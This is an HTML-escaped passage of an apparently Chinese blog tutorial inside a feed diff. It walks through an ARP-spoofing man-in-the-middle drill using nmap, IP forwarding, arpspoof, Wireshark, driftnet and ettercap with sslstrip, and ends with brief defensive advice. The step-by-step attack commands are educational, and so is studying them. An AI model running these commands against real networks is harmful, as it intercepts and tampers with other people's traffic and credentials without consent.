+&lt;h3 id='arpspoofarp'&gt;Arpspoof(ARP欺骗）&lt;/h3&gt;
+
+&lt;p&gt;ARP欺骗工具，工作原理就是不断的向目标（攻击对象）发送ARP数据包，包内容为“我是XXX，请把发给XXX的数据包发给我”。安装方法：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo apt-get install dsniff&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id='ettercap'&gt;Ettercap(数据包嗅探和篡改)&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href='http://ettercap.github.io/ettercap/index.html'&gt;Ettercap&lt;/a&gt;，“中间人”攻击利器，ARP欺骗、DNS欺骗、数据包替换等等，十分强大，不可细说，详细使用方式参考手册（man ettercap)。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo apt-get install ettercap-graphical&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;ettercap实现ARP欺骗方式如下 $ sudo ettercap -i eth0 -Tq -M arp:remote /目标IP/ /网关IP/&lt;/p&gt;
+
+&lt;h3 id='driftnet'&gt;Driftnet&lt;/h3&gt;
+
+&lt;p&gt;抓取经过本机的网络数据包中的图片并显示，同时支持抓取和显示音频文件（来源man手册），安装：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo apt-get install driftnet&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id='id7'&gt;局域网典型攻击演习&lt;/h2&gt;
+
+&lt;p&gt;本演习系统环境如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ lsb_release -a
+Distributor ID:	Ubuntu
+Description:	Ubuntu 12.10
+Release:	12.10
+Codename:	quantal&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id='1'&gt;第1步：锁定目标&lt;/h3&gt;
+
+&lt;p&gt;该步不是必需。使用nmap命令扫描局域网，获得主机列表，操作如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ nmap -sP  192.168.1.0/24&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;“-sP” 表示使用Ping方式扫描；&lt;/li&gt;
+
+&lt;li&gt;“192.168.1.0/24”表示扫描&amp;#8221;192.168.1.1-192.168.1.254&amp;#8221;这个网段的所有机器。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;nmap命令扫描结果仅供参考，也可以尝试其他参数扫描，详细使用方法参考&lt;a href='http://nmap.org/man/zh/'&gt;NmapManual&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h3 id='2'&gt;第2步：收集信息&lt;/h3&gt;
+
+&lt;p&gt;该步不是必需。选定目标为主机A(这里假定IP地址为192.168.1.110)，使用命令&amp;#8221;nmap 192.168.1.110&amp;#8221;可获得主机A的详细情况，如服务端口开放情况，操作系统类型等信息。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ nmap -A 192.168.1.110
+Starting Nmap 6.00 ( http://nmap.org ) at 2013-08-12 12:34 CST 
+Nmap scan report for 10.3.3.108
+Host is up (0.00026s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1.1 (protocol 2.0)
+...
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+873/tcp open  rsync       (protocol version 30) 
+Service Info: OS: Linux; CPE: cpe:/o:linux:kernel&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id='3iparp'&gt;第3步：开启IP转发和ARP欺骗&lt;/h3&gt;
+
+&lt;p&gt;该步仅针对交换式局域网，共享式局域网可以忽略（共享式网络只要打开网卡的混杂模式就可以抓取所有内网数据包），ARP欺骗一般目的是把自己伪装成网关，但如果不作处理，当被欺骗数据包到达后就会被本机丢弃（因为自己到底不是网关，还不知道如何处理这类数据包），这当然是不允许的。开启IP转发功能可以解决该问题，IP转发负责把该类数据包再转发给真正的网关处理，开启IP转发的方法(注意使用root操作第二条命令）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo su
+# echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;ARP欺骗使用arpspoof命令（开启双向欺骗，即同时欺骗主机A和网关）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo arpspoof -i eth0 -t 192.168.1.110 192.168.1.1
+$ sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.110&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&amp;#8220;-i eth0&amp;#8221;指定设备节点，无线网络时可能是&amp;#8221;-i wlan0&amp;#8221;；&lt;/li&gt;
+
+&lt;li&gt;&amp;#8220;-t 192.168.1.xxx&amp;#8221;指定欺骗对象，如果不指定该项，则欺骗对象为整个网络（ARP病毒引起局域网瘫痪就是这么干的，操作前需注意)，最后一个参数&amp;#8221;192.168.1.xxx&amp;#8221;指伪装目标。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;上面第一条命令告诉主机A(192.168.1.110)，我是网关(192.168.1.1)，第二条命令告诉网关，我是主机A，故完成双向欺骗。&lt;/p&gt;
+
+&lt;h3 id='4'&gt;第4步：抓数据包&lt;/h3&gt;
+
+&lt;p&gt;该步不是必需。抓包分析只是为了辅助需要（通过分析数据包流量情况监控攻击工程，同时也是深入理解攻击原理的有效方法），使用wireshark工具抓取所有和主机A相关的数据包，过滤掉不相关数据包，只抓取主机A发出或者发给主机A的数据包。启动wireshark:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo wireshark&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;选择对应网络设备节点（一般有线网络选择eth0,无线网络选择wlan0)，开始抓包，在Filter输入框输入显示过滤条件：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ip.addr == 192.168.1.110&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;回车后应该在屏幕上看到已抓取包的列表，现在你可以仍然调取和分析主机A上网流量情况。&lt;/p&gt;
+
+&lt;h3 id='5'&gt;第5步：收获果实&lt;/h3&gt;
+
+&lt;p&gt;抓取主机A http流量中的图片，通过driftnet工具实现，运行下面命令：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ sudo driftnet -i eth0&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;篡改主机A访问的页面，通过ettercap工具实现，ettercap是个强大的工具，再配合sslstrip，基本可以为所欲为。 ettercap详细使用方法请参考man手册（man ettercap)，这里有一篇&lt;a href='http://www.2cto.com/article/201301/183322.html' title='Ettercap简要原理介绍以及使用说明'&gt;文章&lt;/a&gt;可以参考一二。&lt;/p&gt;
+
+&lt;h2 id='id8'&gt;该如何防范&lt;/h2&gt;
+
+&lt;p&gt;安全形势如此严重，不得不防啊。但安全总是有成本和代价的，下面建议供参考。&lt;/p&gt;
+&lt;br /&gt;
+&lt;p&gt;对于交换式局域网，重点守住两条：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;交换机端口绑定IP和MAC，完成该步，可以说基本天下太平，这个一般是网络管理员的职责；&lt;/li&gt;
+
+&lt;li&gt;如果第1步无法实现，在自己的机器上把网关IP和MAC地址静态绑定。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;br /&gt;
+&lt;p&gt;对于共享式局域网,这一般是在家里、街上或者出租房中合伙使用的无线路由器下的网络。也是重点守着两条：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;不要随便连接未知无线网络；(A)&lt;/li&gt;
+
+&lt;li&gt;管理好自己家里的无线路由器，最好使用WPA加密方式，并定期检察安全情况。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id='id9'&gt;参考资料&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href='http://www.91ri.org/4408.html' title='Linux渗透之Ettercap详解'&gt;Linux渗透之Ettercap详解&lt;/a&gt; (较详细的ettercap文档翻译说明)&lt;br /&gt;&lt;a href='http://www.2cto.com/article/201301/183322.html' title='Ettercap简要原理介绍以及使用说明'&gt;Ettercap简要原理介绍以及使用说明&lt;/a&gt; (Ettercap功能介绍)&lt;br /&gt;&lt;a href='http://vmeng.blog.51cto.com/2305370/1143426' title='用ettercap实现DNS欺骗实例'&gt;用ettercap实现DNS欺骗实例&lt;/a&gt;&lt;br /&gt;&lt;a href='http://netsecurity.51cto.com/art/201212/371895.htm' title='不知不觉帐号密码被窃:中间人攻击介绍'&gt;不知不觉帐号密码被窃:中间人攻击介绍&lt;/a&gt;&lt;br /&gt;&lt;a href='http://blog.sina.com.cn/s/blog_4a898cfb0100t8j7.html' title='通过伪造CA证书，实现SSL中间人攻击(附详细过程和实现代码）'&gt;通过伪造CA证书，实现SSL中间人攻击(附详细过程和实现代码）&lt;/a&gt;&lt;br /&gt;&lt;a href='http://www.rootoorotor.org/hacking/%E5%85%B3%E4%BA%8Earp%E6%AC%BA%E9%AA%97%E4%B8%8Emitm%EF%BC%88%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%EF%BC%89%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/' title='关于ARP欺骗与MITM（中间人攻击）的一些笔记（二）'&gt;关于ARP欺骗与MITM（中间人攻击）的一些笔记（二）&lt;/a&gt;&lt;/p&gt;</content>
+   </entry>
+   
+ 
+</feed>
